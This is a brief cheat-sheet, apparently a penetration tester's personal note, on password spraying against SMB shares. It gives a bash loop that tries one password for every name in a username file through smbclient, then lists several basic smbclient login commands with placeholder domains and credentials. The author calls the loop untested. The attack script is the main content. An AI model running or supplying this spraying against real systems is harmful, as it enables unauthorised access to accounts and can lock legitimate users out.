Password Spray SMB logins
-----------------------------
```bash
# Needs tweaking to loop through "usernames.txt"
# Something like this, note untested.....

####### BEGIN SCRIPT ############
#!/bin/bash
while read users; do
  smbclient \\\\server.corp.domain.name.org\\sharename -U DOMAIN/\$users%passwordgoeshere
done <usernames.txt
####### END SCRIPT ##############

# List of usernames
username1
username2
username3
username4
username5

# basic SMB login
/usr/bin/smbclient \\\\server78\\publicfolder -U=user%password

smbclient \\\\server.corp.domain.name.org\\sharename -U 'DOMAIN\USERNAME'

smbclient \\\\server.corp.domain.name.org\\sharename -U DOMAIN/\<USERNAME>%passwordgoeshere
````
